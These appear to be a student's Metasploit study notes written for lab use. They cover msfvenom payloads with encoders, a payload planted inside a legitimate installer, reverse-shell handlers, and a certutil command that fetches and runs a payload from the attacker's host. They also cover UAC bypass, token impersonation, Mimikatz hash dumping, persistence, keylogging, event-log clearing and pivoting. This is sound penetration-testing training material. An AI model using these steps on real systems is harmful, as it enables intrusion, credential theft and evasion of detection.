# Metasploit Framework

TIP: if `SeImpersonatePrivilege` is available after `getprivs`, it is likely that you can `getsystem` to elevate the privilege

### MSFDB
- sudo systemctl enable postgresql //enacle postgresql on startup
- sudo systemctl start postgresql //start the service
- sudo systemctl status postgresql //check postgresql status
- sudo msfdb //start msfdb
- sudo msfdb init //initialise db

### MSFConsole
- search -h to learn about search options
- Importing nmap scans: `db-import <path of nmap xml output>`
- To perfoem a scan on internal network through the initial victim, run `run autoroute -s <IP>` in meterpreter


### MySQL with MSF
- useful modules: version, schemadum, login, file_enum
- modules under /admin/ will need cred to use: mysql_enum, mysql_sql
- TIP: can use `loot`, and `creds` to see credentials etc

### Nessus with MSF
- Do the scan with nessus and export it in XML `export nessus`
- Load it in with `db_import <location of nessus scan>`
- use the `vulns` command to see possible vulnerabilies

### WMAP (web app) vuln scan with MSF
- Comes with msf so just type: `load wmap` and to see all the commands available we can do `wmap_` and press tab
- To show the current modules being used to scan the target we say: `wmap_run -t`
- use `wmap_vulns -l` to list all vulns after a scan


### MSFVenom
- To get help, we can say: `msfvenom --list <the option you need help>` eg:`msfvenom --list formats`, `msfvenom --list payloads`
- Sample Msfvenom command: `msfvenom -p <payload type> LHOST=<our IP> LPORT=<our port> -f <file format> > <Location of the output>`

### Encoding
- useful encoders are shikata_ga_nai and cmd/powershell_base64
- To list out encoders `msfvenom --list encoders`
- Sample command: `msfvenom -p <payload> LHOST=<IP> LPORT=<IP> -e x86/shikata_ga_nai -f exe > <location>`
- For iteration, we can specify by using `-i 10` or `iterations 10`

### Injecting Payloads into PE (-x, -k)
- sample command: `msfvenom -p <payload> LHOST=<IP> LPORT=<IP> -e x86/shikata_ga_nai -f exe -x <Path to the exe eg: ~/Downloads/wrar602.exe> > <location>`

### MSF Resource Scripts for automation (like bash scripts)
- All resource scripts are located at: /usr/share/metasploit-framework/scripts/resource/ 
- Example of a simple script below:
```handler.rc
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
run
```
- To run the above script use: msfconsole -r handler.rc //-r flag for resource script
- Another example below
```
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.7
run
```
- Another example below
```db_status.rc
db_status
workspace
workspace -a Test
```
- If you are already inside msfconsole, you can load up a resource script by: `resource ~/usr/share/metasploit-framework/scripts/resource/<scriptName>`
- To export a script from inside the console, do your actions, and terminate after typing run, and type:`makerc <$PATH/ScriptName>`

## Exploitation
- A few key goal:
  1. To see if there are inherit vulns
  2. if no inherit vulns, then see if we can gather info using brute forcing, and see if we can login using actual credentials
 
### HTTP file server
- difference of http file server and typical http server is that it's just use to file share and no other usage
- popular servers include: Rejetto HFS
- Rejetto V2.3 is vuln to RCE attack

**Nice practical situation encountered**
Scenario: when using the tomcat_jsp_upload_bypass module, a cmd was popped in msf, but we want a meterpreter for all the good stuff, so what can we do now? We can 
use `msfvnom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=1234 -f exe > meterpreter.exe` to gen a payload, host a simple python server on our(attacker) 
machine using `sudo python -m SimpleHTTPServer 80` and use the cmd to `certutil -urlcache -f http://<IP>/meterpreter.exe meterpreter.exe, then we can open a handler
and catch the shell.

## Post Exploitation
- Goals of Post: Priv Esc, Maintain Persistence, Clearing Tracks
- Techniques: Local Enum, Priv Esc, Dumping Hashes, Pivoting, Establish Persistence, Clearing Tracks

**Popular Meterpreter Commands**
- sysinfo
- getuid
- getenv PATH //To enum the environment and how it is configured
- getenv TERM
- search -d /usr/bin -f *backdoor* //find all backdoor files under the /usr/bin directory
- ps //to show all processes
- migrate //to migrate to processes

**Upgrading Sessions**
- shell_to_meterpreter //post module
- sessions -u //quick command

### Windows Post Exploitation Modules
Goal of Enumeration: User privileges, logges on users, VM check, Enumerate installed programs, AVs, computers connected to domain, installed patched, shares
- module to migrate if we don't want to use `migrate` within meterpreter: manage/archmigrate, manage/migrate
- get privs module: gather/win_privs
- check log on users: enum_logged_on
- check if is VM module: gather/checkvm
- see what programs are installed: gather/enum_applications
- see if have Anti-virus: gather/enum_av
- see if the computer is part of domain: gather/enum_computers
- patches: gather/enum_patches // In the options, KB essentially are the hotfix IDs of windows. TIPS: sometimes the module can fail, and in this case, we can instead go into shell and do a systeminfo to get all the Hotfixes
- Shares: gather/enum_shares
- module `manage/enable_rdp` can enable rdp on the victim 

### Bypassing UAC
One way to bypass and is quite popular is to utilize the "Windows Escalate UAC Protection Bypass (In Memory Injection)" module to bypass UAC by utilizing the trusted publisher certificate through process injection, which will spawn a second shell that has the UAC flag turned off.

Example: when `getsystem` fails on the target, we can `getprivs` to see our privileges, open a shell sesssion and `net users` to see all accounts, 
to see groups we do `net localgroup administrators`

The module to use is the `bypassuac` module, which comes with many different techniques, the one we are using is `bypassuac_injection`, this module is quite neat because it works with newer windows.

### Priv Esc: Token Impersonation with Incognito (a module in msf)
- access tokens are a core element of auth process on windows and are created, managed by the LSASS
- it allows the system to provide the neccessary resource for the user to create processes without entering credentials everytime
- access tokens are generated by winlogon.exe when user authenticates successfully and includes the identity and priv of the user associated with the thread or process. The token is then attached to userinit.exe, after which all child processes started by a user will inherit a copy of the token from the creator and will run under the same privileges
- access tokens are sorted by security levels, the security levels determines the privileges that a token can have
- There are 2 types of security levels:
  1. Impersonate-level tokens: used for non-interactive login, typically through specific system services or domain logons
     It can be used locally and not on any external systems that utilize the token  
  2. Delegate-level tokens: created through an interactive login on Windows, through traditional login or through remote access like RDP etc (way more dangerour)
     This token pose the largest threat as they can be used to impersonate tokens on any system
- To impersonate tokens (piv esc), it depends on the privs of the initial access account and the impersonation or delegation tokens available
- The following privs are required for a successful impersonation attack:
  1. SeAssignPrimaryToken: This allows a user to impersonate tokens
  2. SeCreateToken: This allows a user to create an arbitrary token with admin privs
  3. SeImpersonatePrivilege: Allows a user to create a process under another users privileges (typically with privileges)

- **Incognito Module (plug-in)**: Built-in meterpreter module that was originally a standalone app, which allows the impersonation of tokens in post exploitation, prequisite: SeImpersonatePrivilege
- we can use the module to display available tokens which we can impersonate

Demo
(Post Exploitation)
- load incognito
- list_tokens -u //see all tokens
- see if have `Administrator`
- if have `impersonate_token "ATTACKDEFENSE\Administrator"`
- then we can `migrate` to a administrator process and dump hashes

### Dumping Hashes with Mimikatz
- to use mimikatz successfully, we need priv account and also need to migrate to LSASS
- after `load kiwi` we can type `help` to get help
- mimikatz is in the /usr/share/windows-resources/binaries/x64/
- After the hashdump, use the module `smb/psexec` module to access the session legitimately

### Establishing Persistence
- Goal of persistence is to keep access to the system in the event of any interruptions such as shutdown, change of password, thus we cannot rely on vulnerable services or foothold
- To acquire persistence, priv credentials are needed
- To search for persistence modules, type `search platform:windows persistence`. popular modules: persistence_service, others aren't too stable

**Through RDP**
- Module is `enable_rdp`
- credentials are needed for this method

### Keylogging
- TIP: the keylogger works more stable with the explorer process, so migrate before using it
- `keyscan_start` in meterpreter to initiate the key logging, keyscan_dump to dump what's being stored

### Clearing tracks in Eventlogs
- Log types:
  - Application logs: logs all app/program events like startups, crashes etc.
  - Sys logs: Stores system events like startups, reboots
  - Security logs: Stores security events like password changes, auth failures etc
- The command is `clearev` in meterpreter to clear tracks

### Pivoting
Goal: Pivoting is to use the initial host to compromise other hosts on the same network which we previously do not have access to

Demo
- After compromising, use `ipconfig` in meterpreter to check NIC
- Add the interface as a node in that route by saying `run autoroute -s 10.2.16.0/20`
- Then we can use scans modules in msf **note that only modules in msf will work, we cannot perform other scans from our kali machine**
- If we want to scan the subnet from the kali box, we will need to set up port forwarding, by doing `portfwd add -l <the local port on kali, eg:1234> -p <Victim 2 open port, eg:80> -r <Victim 2 IP>`
(above command basically says any traffic to local kali box port 1234 will get forwarded to Victim 2 ip to port 80, through victim 1, since meterpreter is running on victim 1), the response will look like (Victim2 responds → Victim1 → Meterpreter session → back to Kali)
- The result of the above will be a command like this `db_nmap -sS -sV -p 1234 localhost` so instead of scanning the target, we want to scan our localhost port 1234 so the traffic will send to the target
- And assuming victim 2 have badblue running on port 80(which it is on lab), we now want the payload to be a bind shell instead, and the RHOSTS to Victim 2 IP.

### Linus Post Exploitation







